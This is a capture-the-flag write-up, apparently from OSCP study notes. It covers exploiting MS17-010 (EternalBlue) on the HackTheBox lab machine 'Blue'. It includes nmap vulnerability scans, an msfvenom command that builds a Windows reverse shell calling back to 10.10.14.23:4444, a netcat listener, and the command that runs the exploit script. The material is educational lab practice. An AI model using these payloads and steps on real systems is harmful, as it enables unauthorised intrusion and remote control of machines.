# Blue

## IP
The HackTheBox IP for this machine was 10.10.10.40

## Nmap
I ran Nmap three times for this machine. The first was a simple service scan:

```
kali@kali:~$ sudo nmap -sS -p- 10.10.10.40 -vv
...
PORT    STATE SERVICE      REASON
135/tcp open  msrpc        syn-ack ttl 127
139/tcp open  netbios-ssn  syn-ack ttl 127
445/tcp open  microsoft-ds syn-ack ttl 127
```

I then ran a **-A** against all three open identified ports:

```
kali@kali:~$ sudo nmap -A 10.10.10.40 -p135,139,445 -vv
...
PORT    STATE SERVICE      REASON          VERSION
135/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds syn-ack ttl 127 Windows 7 Professional 7601 Service Pack 1 
...
Host script results:
|_clock-skew: mean: 9m36s, deviation: 1s, median: 9m35s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 13581/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 12383/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 19006/udp): CLEAN (Timeout)
|   Check 4 (port 18036/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-10-31T03:01:59+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-10-31T03:01:57
|_  start_date: 2020-10-31T02:59:24
```

Finally, I ran **-A** against the SMB-specific ports (139, 445) turning on all the NSE scripts from SMB vulnerabilities:

```
kali@kali:~$ sudo nmap -A 10.10.10.40 -p139,445 --script=smb-vuln-* -vv
...
PORT    STATE SERVICE      REASON          VERSION
139/tcp open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
...
Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
| smb-vuln-ms17-010 : 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
```

The NSE scripts show Blue is vulnerable to MS17-010, the same issue we exploited for Legacy. But this time, I didn't want to use a walkthrough of the box. Instead, I wanted to see how to manually exploit the issue *for the issue* and not just for the box.

## Searchsploit
![Image of Searchsploit for MS17-010](https://github.com/Malwolf24/OSCP/blob/main/Blue/images/blue_searchsploit.png)

## Exploit
For this manual walkthrough, I followed Red Team Zone's "Eternal Blue" write-up (https://redteamzone.com/EternalBlue/). First, I mirrored **42315.py** down to my local machine and then made a working copy of it called **exploit.py**. 

```searschsploit -x 42315.py```

```cp 42315.py exploit.py```

For this exploit to work, we need to download **mysmb.py** from https://github.com/worawit/MS17-010/blob/master/mysmb.py:

```
kali@kali:~/Desktop/OSCP/Blue$ python exploit.py
Traceback (most recent call last):
  File "exploit.py", line 3, in <module>
    from mysmb import MYSMB
ImportError: No module named mysmb
```

```
kali@kali:~/Desktop/OSCP/Blue$ wget https://github.com/worawit/MS17-010/blob/master/mysmb.py
--2020-10-30 23:32:20--  https://github.com/worawit/MS17-010/blob/master/mysmb.py
Resolving github.com (github.com)... 140.82.113.3
Connecting to github.com (github.com)|140.82.113.3|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘mysmb.py’

mysmb.py                                                   [  <=>                                                                                                                       ] 220.11K   553KB/s    in 0.4s    

2020-10-30 23:32:22 (553 KB/s) - ‘mysmb.py’ saved [225389]
```

Next, we use MSFVenom to generate a reverse TCP shell for windows, specifying my localhost and port 4444 for the shell to connext to once executed:

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.23 LPORT=4444 -f exe > shell.exe
```

Great! Now we have the exploit and we have our shell. Now, how do we get them to play nice together such that the exploit will execute our shell and connext back to our attacking machine? For that, we need to modify the exploit Python code:

![Exploit modification](https://github.com/Malwolf24/OSCP/blob/main/Blue/images/blue_exploit_mod.png)

Then set up a netcat listener on port 4444:

```nc -nlvp 4444```

And run our exploit code (after we specify username='guest' in the exploit code...for that part...):

```python exploit.py 10.10.10.40```

## Success!
![Success!](https://github.com/Malwolf24/OSCP/blob/main/Blue/images/blue_success.png)

From here, as with Legacy, we are already system administrator, so we just navigate to both the user's Desktop and administrator's Desktop and retrieve the flags. Success!
